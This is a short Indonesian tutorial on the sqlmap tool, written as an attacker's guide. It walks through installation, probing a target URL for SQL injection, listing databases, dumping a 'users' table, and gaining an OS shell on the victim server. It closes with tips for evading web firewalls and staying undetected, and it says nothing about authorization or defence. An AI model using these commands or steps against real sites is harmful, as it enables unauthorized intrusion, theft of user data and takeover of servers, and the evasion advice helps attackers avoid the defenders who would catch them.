Tutorial Penggunaan sqlmap: Dari Instalasi Hingga OS Shell

Banyak orang bingung pakai sqlmap karena terlalu banyak perintah. Tenang, kita bedah pelan-pelan pakai bahasa yang gampang dimengerti, dari cara pasang sampai dapet akses ke sistem target.

1. Persiapan & Instalasi

Apapun perangkatnya (Termux, Linux, atau VPS), cara pasangnya sama karena pakai basis Python.

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
Kenapa pakai perintah itu?

Kita mengambil "nyawa" sqlmap langsung dari pusatnya (GitHub) supaya dapat fitur terbaru untuk nembus keamanan web zaman sekarang.

2. Mencari Celah (Scanning)

Langkah awal adalah "mengetuk pintu" target untuk melihat apakah ada celah yang bisa dimasuki.

python3 sqlmap.py -u "http://target.com/cek.php?id=1" --dbs
Penjelasan Perintah:

-u : Target URL yang mau dicek.
--dbs : Menyuruh sqlmap mencari nama-nama Database yang ada di dalamnya.

3. Mengambil Data (Dumping)

Setelah tahu nama Database-nya, saatnya kita intip isi tabel dan datanya.

# Cari Tabel di database 'db_utama'
python3 sqlmap.py -u "URL" -D db_utama --tables

# Ambil data dari tabel 'users'
python3 sqlmap.py -u "URL" -D db_utama -T users --dump

4. Level Master: Ambil Alih Sistem (--os-shell)

Ini adalah tahap akhir. Jika beruntung, kita bisa mengendalikan server lewat terminal jarak jauh.

python3 sqlmap.py -u "URL" --os-shell
Apa itu OS Shell?

Kondisi di mana kita bisa mengetik perintah apa saja ke server target, seperti melihat file sistem atau menghapus data, langsung dari terminal kita.

5. Tips Biar Nggak Gampang Ketahuan

Biar nggak langsung diblokir sama keamanan web target, gunakan trik ini:

  • --random-agent : Menyamarkan diri jadi browser biasa (Chrome/Safari).
  • --tamper=space2comment : Mengacak kode biar nggak kebaca sama satpam digital (Firewall).
